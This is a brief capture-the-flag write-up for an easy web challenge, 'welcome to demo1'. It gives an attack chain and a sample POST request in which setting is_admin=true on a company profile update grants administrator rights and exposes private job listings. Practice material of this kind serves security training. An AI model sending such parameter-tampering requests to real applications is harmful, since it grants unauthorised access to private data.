---
name: ctf-welcome-to-demo1
description: Web app allows privilege escalation by setting is_admin=true in profile update
---

# Challenge: welcome to demo1

## Context
- Category: web
- Difficulty: easy
- Vuln Type: Privilege Escalation
- Hint: 在更新公司资料时，也许可以成为管理员并查看私密job。

## Attack Chain
1. Login to the web application with the demo account.
2. Update the company profile by sending a POST request to `/system_config/{company_id}` with `is_admin=true`.
3. After privilege escalation, view the private job details at `/company/{company_id}/jobs`.

## Key Payloads
```
POST /system_config/1
Content-Type: application/x-www-form-urlencoded

name=demo&is_admin=true
```
